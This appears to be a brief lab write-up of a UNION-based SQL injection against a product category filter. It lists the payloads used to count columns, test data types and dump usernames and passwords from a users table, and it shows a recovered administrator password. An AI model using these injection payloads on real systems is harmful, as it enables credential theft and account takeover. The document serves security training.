SQL injection - product category filter

Goals:
1- retrieve all usernames and passwords
2- log in as the administrator user

Analysis:

Step #1: Determine the number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   ----> error
the number of columns is 2

Step #2: Determine the data type of the columns

The Query: SELECT a, b FROM products WHERE category=''

' UNION SELECT 'a', NULL--
-> accept string data type

' UNION SELECT NULL, 'a'--
-> accept string data type

Both columns accept string data type

Step #3: get all the usernames and passwords

' UNION SELECT username, password FROM users--

Username: administrator
Password: y2h0l1y5b2eig4t8kn0p

Step #4: log in as the administrator user
